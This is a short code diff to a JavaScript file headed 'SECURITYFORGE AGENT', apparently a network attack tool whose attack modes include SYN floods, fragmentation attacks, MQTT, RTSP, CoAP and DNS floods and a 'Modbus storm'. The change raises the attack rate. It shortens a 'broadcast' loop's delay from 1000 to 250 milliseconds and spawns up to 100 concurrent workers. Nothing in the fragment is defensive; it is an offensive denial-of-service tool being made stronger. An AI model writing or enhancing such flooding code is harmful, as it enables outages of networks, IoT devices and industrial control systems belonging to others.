@@ -1,5 +1,6 @@
 /**
  * SECURITYFORGE AGENT V36.0 (EXPANDED ARSENAL)
+ * - V36.1: CONCURRENCY FIX for Ghost/SIP.
  * - V36.0: ADB, SIP, Modbus support.
  * - V35.1: HOST PARSING.
  * - V35.0: SMART LOGIN.
@@ -167,9 +168,14 @@ const startAttack = (job) => {
                 }
 
                 totalRequests++;
-                if (running) setTimeout(broadcast, 1000);
+                if (running) setTimeout(broadcast, 250); // Faster loop
             };
-            broadcast();
+
+            // Spawn concurrent workers
+            const threadCount = Math.min(job.concurrency || 10, 100);
+            for(let i=0; i<threadCount; i++) {
+                setTimeout(broadcast, i * 50);
+            }
         }
         else if (job.use_iot_death_ray || job.use_mqtt_flood || job.use_rtsp_storm || job.use_coap_burst || job.use_dns_reaper || job.use_syn_flood || job.use_frag_attack || job.use_modbus_storm) {
             const targetHost = getHost(job.target);
